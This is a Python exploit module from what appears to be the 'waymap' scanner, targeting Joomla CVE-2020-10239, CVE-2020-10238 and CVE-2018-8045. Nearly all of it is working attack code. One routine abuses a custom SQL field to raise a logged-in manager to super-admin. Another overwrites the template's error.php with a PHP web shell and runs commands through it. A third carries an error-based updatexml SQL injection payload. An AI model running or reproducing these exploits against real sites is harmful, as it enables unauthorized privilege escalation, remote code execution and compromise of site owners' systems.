# Copyright (c) 2024 waymap developers
# See the file 'LICENSE' for copying permission.
# jm.py profile high

from colorama import Fore, Style, init
init(autoreset=True)

import requests
import re
import random
from colorama import Fore, Style, init
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init()

def extract_token_10239(resp):
    match = re.search(r'name="([a-f0-9]{32})" value="1"', resp.text, re.S)
    if match is None:
        print(f"{Fore.RED}{Style.BRIGHT}Cannot find CSRF token!{Style.RESET_ALL}\n")
        return None
    return match.group(1)

def try_admin_login_10239(sess, profile_url, uname, upass):
    admin_profile_url = profile_url + '/administrator/index.php'
    print(f'{Fore.YELLOW}Getting token for Manager login{Style.RESET_ALL}')
    resp = sess.get(admin_profile_url, verify=False)
    token = extract_token_10239(resp)
    if not token:
        return False
    print(f'{Fore.YELLOW}Logging in to Manager{Style.RESET_ALL}')
    data = {
        'username': uname,
        'passwd': upass,
        'task': 'login',
        token: '1'
    }
    resp = sess.post(admin_profile_url, data=data, verify=False)
    if 'task=profile.edit' not in resp.text:
        print(f'{Fore.RED}Manager Login Failure!{Style.RESET_ALL}')
        return False  
    print(f'{Fore.GREEN}{Style.BRIGHT}Manager Login Successful! Username: {uname}, Password: {upass}{Style.RESET_ALL}')
    return True

def check_admin_10239(sess, profile_url):
    profile_url_check = profile_url + '/administrator/index.php?option=com_content'
    resp = sess.get(profile_url_check, verify=False)
    token = extract_token_10239(resp)
    if not token:
        print(f"{Fore.RED}{Style.BRIGHT}You are not Manager!{Style.RESET_ALL}")
        return None  
    return token

def get_manager_id_10239(profile_url, sess):
    profile_url_get = profile_url + '/administrator/index.php?option=com_admin&view=profile&layout=edit'
    resp = sess.get(profile_url_get, verify=False)
    return re.findall(r'id=\d+', resp.text)

def create_new_field_10239(profile_url, sess, token):
    data = {
        'jform[title]': 'SQL query',
        'jform[type]': 'text',
        'jform[name]': 'SQL query',
        'jform[label]': 'SQL query',
        'jform[description]': 'SQL query',
        'jform[required]': 1,
        'jform[state]': 1,
        'jform[group_id]': 0,
        'jform[access]': 1,
        'jform[language]': '*',
        'jform[params][showlabel]': 1,
        'jform[params][display]': 2,
        'jform[params][display_readonly]': 2,
        'jform[id]': 0,
        'jform[context]': 'com_content.article',
        'task': 'field.apply',
        token: 1
    }
    resp = sess.post(profile_url + "/administrator/index.php?option=com_fields&context=com_content.article", data=data, verify=False)
    id = re.findall(r'id=\d+', resp.text)
    id_account = get_manager_id_10239(profile_url, sess)
    ran = '%d' % random.randrange(1, 10000)
    profile_url_post = profile_url + '/administrator/index.php?option=com_fields&context=com_content.article&layout=edit&' + id[0]
    newdata = {
        'jform[title]': 'SQL query ' + ran,
        'jform[type]': 'sql',
        'jform[name]': 'SQL query ' + ran,
        'jform[label]': 'SQL query ' + ran,
        'jform[description]': 'SQL query',
        'jform[required]': 1,
        'jform[fieldparams][query]': 'UPDATE #__user_usergroup_map SET group_id = 8 WHERE user_' + id_account[0] + ' AND group_id BETWEEN 6 AND 7;',
        'jform[state]': 1,
        'jform[group_id]': 0,
        'jform[access]': 1,
        'jform[language]': '*',
        'jform[params][showlabel]': 1,
        'jform[params][display]': 2,
        'jform[params][display_readonly]': 2,
        'jform[id]': id,
        'task': 'field.apply',
        'jform[context]': 'com_content.article',
        token: 1
    }
    newdata['task'] = 'field.apply'
    sess.post(profile_url_post, data=newdata, verify=False)
    profile_url_sql = profile_url + '/administrator/index.php?option=com_content&view=article&layout=edit'
    sess.get(profile_url_sql, verify=False)

def check_super_admin_10239(profile_url, sess):
    print(f"{Fore.YELLOW}Checking Super-admin{Style.RESET_ALL}")
    profile_url_config = profile_url + '/administrator/index.php?option=com_config'
    resp = sess.get(profile_url_config, verify=False)
    results = re.findall(r'name="([^"]+)"\s+[^>]*?value="([^"]+)"', resp.text, re.S)
    if not results:
        print(f"{Fore.RED}{Style.BRIGHT}You are not super-admin!{Style.RESET_ALL}")
        return False
    else:
        print(f"{Fore.GREEN}{Style.BRIGHT}You are now Super-admin!{Style.RESET_ALL}")
        return True  

def rce_10239(sess, profile_url, cmd, token):
    filename = 'error.php'
    shlink = profile_url + '/administrator/index.php?option=com_templates&view=template&id=506&file=506&file=L2Vycm9yLnBocA%3D%3D'
    shdata_up = {
        'jform[source]': "<?php echo 'Hacked by HK\n' ;system($_GET['cmd']); ?>",
        'task': 'template.apply',
        token: '1',
        'jform[extension_id]': '506',
        'jform[filename]': '/' + filename
    }
    sess.post(shlink, data=shdata_up)
    path2shell = '/templates/protostar/error.php?cmd=' + cmd
    print(f'{Fore.GREEN}Checking shell:{Style.RESET_ALL}')
    shreq = sess.get(profile_url + path2shell)
    shresp = shreq.text
    print(shresp + f'{Fore.GREEN}Shell link: \n' + (profile_url + path2shell) + f'{Style.RESET_ALL}')
    print(f'{Fore.GREEN}{Style.BRIGHT}Module finished.{Style.RESET_ALL}')

def scan_cve_2020_10239(target):
    uname = input(f"{Fore.YELLOW}Enter Manager Username: {Style.RESET_ALL}")
    upass = input(f"{Fore.YELLOW}Enter Manager Password: {Style.RESET_ALL}")
    cmd = 'whoami'  
    sess = requests.Session()
    
    print(f'{Fore.CYAN}{Style.BRIGHT}Target: {target}{Style.RESET_ALL}')
    
    if not try_admin_login_10239(sess, target, uname, upass):
        return False

    token = check_admin_10239(sess, target)
    if token is None:  
        return False

    create_new_field_10239(target, sess, token)

    if check_super_admin_10239(target, sess):
        rce_10239(sess, target, cmd, token)
        return True 

    return False 

# -------------------------------------------------------

import requests
import re
from colorama import Fore, Style, init
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init()

def extract_token_10238(resp):
    match = re.search(r'name="([a-f0-9]{32})" value="1"', resp.text, re.S)
    if match is None:
        print(f"{Fore.RED}{Style.BRIGHT}Cannot find CSRF token!{Style.RESET_ALL}")
        return None
    return match.group(1)

def try_admin_login_10238(sess, profile_url, uname, upass):
    admin_profile_url = profile_url + '/administrator/index.php'
    print(f'{Fore.YELLOW}Getting token for admin login{Style.RESET_ALL}')
    resp = sess.get(admin_profile_url, verify=False)
    token = extract_token_10238(resp)
    if not token:
        return False
    print(f'{Fore.YELLOW}Logging in to admin{Style.RESET_ALL}')
    data = {
        'username': uname,
        'passwd': upass,
        'task': 'login',
        token: '1'
    }
    resp = sess.post(admin_profile_url, data=data, verify=False)
    if 'task=profile.edit' not in resp.text:
        print(f'{Fore.RED}Admin Login Failure!{Style.RESET_ALL}')
        return None
    print(f'{Fore.GREEN}{Style.BRIGHT}Admin Login Successfully! Username: {uname}, Password: {upass}{Style.RESET_ALL}')
    return True

def check_admin_10238(sess, profile_url):
    profile_url_check = profile_url + '/administrator/index.php?option=com_templates'
    resp = sess.get(profile_url_check, verify=False)
    token = extract_token_10238(resp)
    if not token:
        print(f"{Fore.RED}{Style.BRIGHT}You are not administrator!{Style.RESET_ALL}")
        return None
    return token

def rce_10238(sess, profile_url, cmd, token):
    filename = 'error.php'
    shlink = profile_url + '/administrator/index.php?option=com_templates&view=template&id=506&file=506&file=L2Vycm9yLnBocA%3D%3D'
    shdata_up = {
        'jform[source]': "<?php echo 'Hacked by HK\n' ;system($_GET['cmd']); ?>",
        'task': 'template.apply',
        token: '1',
        'jform[extension_id]': '506',
        'jform[filename]': '/' + filename
    }
    sess.post(shlink, data=shdata_up)
    path2shell = '/templates/protostar/error.php?cmd=' + cmd
    print(f'{Fore.GREEN}Checking shell:{Style.RESET_ALL}')
    shreq = sess.get(profile_url + path2shell)
    shresp = shreq.text
    print(shresp + f'{Fore.GREEN}Shell link: \n' + (profile_url + path2shell) + f'{Style.RESET_ALL}')
    print(f'{Fore.GREEN}{Style.BRIGHT}Module finished.{Style.RESET_ALL}')

def scan_cve_2020_10238(target):
    uname = input("Enter admin username: ")
    upass = input("Enter admin password: ")
    cmd = 'whoami'  
    sess = requests.Session()
    
    print(f'{Fore.CYAN}{Style.BRIGHT}Target: {target}{Style.RESET_ALL}')
    
    if not try_admin_login_10238(sess, target, uname, upass):
        return False

    token = check_admin_10238(sess, target)
    if not token:  
        return False

    rce_10238(sess, target, cmd, token)

# -------------------------------------------------------

import re
import hashlib
import requests
from colorama import Fore, Style, init
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init()

author = 'TrixSec'

def get_pass_8045(profile_url):
    user = input("Enter admin username: ")
    passwd = input("Enter admin password: ")
    login_profile_url = urljoin(profile_url, '/administrator/index.php')
    session = requests.Session()
    content = session.get(login_profile_url, verify=False).content

    re_para = r'<input type="hidden" name="return" value="(.*?)"/>.*<input type="hidden" name="(.*?)" value="1" />'
    match = re.findall(re_para, content.decode(), re.S)

    if match:
        value, token = match[0][0], match[0][1]
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        pass_payload = f'username={user}&passwd={passwd}&option=com_login&task=login&return={value}&{token}=1'
        session.post(url=login_profile_url, headers=headers, data=pass_payload, verify=False)
        print(f"{Fore.GREEN}{Style.BRIGHT}Admin Login Successful!{Style.RESET_ALL}")
        return session, headers
    else:
        print(f"{Fore.RED}{Style.BRIGHT}Failed to retrieve CSRF token or login details.{Style.RESET_ALL}")
        return None, None

def execute_sqli_8045(profile_url, session, headers):
    rand_str = ''.join([str(i) for i in range(10)]) 
    sqli_profile_url = urljoin(profile_url, '/administrator/index.php?option=com_users&view=notes')
    sqli_payload = f'filter[search]=&list[fullordering]=a.review_time DESC&list[limit]=20&filter[published]=1&filter[category_id]=(updatexml(2,concat(0x7e,(md5({rand_str}))),0))'

    r = session.post(url=sqli_profile_url, headers=headers, data=sqli_payload, verify=False)
    if r.status_code == 500 and hashlib.md5(rand_str.encode()).hexdigest()[:31] in r.text:
        print(f"{Fore.GREEN}{Style.BRIGHT}SQL Injection Successful! Exploit URL: {sqli_profile_url}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}SQL Injection Failed!{Style.RESET_ALL}")

def scan_cve_2018_8045(target):
    print(f"{Fore.CYAN}{Style.BRIGHT}Target: {target}{Style.RESET_ALL}")
    session, headers = get_pass_8045(target)

    if session and headers:
        execute_sqli_8045(target, session, headers)
    else:
        return False  

    return True 

# -------------------------------------------------------


def handle_cve_2020_10239(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[+] Starting scan for {Fore.YELLOW}CVE-2020-10239 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")
        scan_cve_2020_10239(profile_url)
        print(f"{Fore.CYAN}[-] Completed scan for {Fore.YELLOW}CVE-2020-10239 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan for {Fore.YELLOW}CVE-2020-10239 {Fore.RED}interrupted. Moving to next CVE...{Style.RESET_ALL}")
        return
def handle_cve_2020_10238(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[+] Starting scan for {Fore.YELLOW}CVE-2020-10238 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")
        scan_cve_2020_10238(profile_url)
        print(f"{Fore.CYAN}[-] Completed scan for {Fore.YELLOW}CVE-2020-10238 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan for {Fore.YELLOW}CVE-2020-10238 {Fore.RED}interrupted. Moving to next CVE...{Style.RESET_ALL}")
        return
def handle_cve_2018_8045(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[+] Starting scan for {Fore.YELLOW}CVE-2018_8045 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")
        scan_cve_2018_8045(profile_url)
        print(f"{Fore.CYAN}[-] Completed scan for {Fore.YELLOW}CVE-2018_8045 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan for {Fore.YELLOW}CVE-2018_8045 {Fore.RED}interrupted. Moving to next CVE...{Style.RESET_ALL}")
        return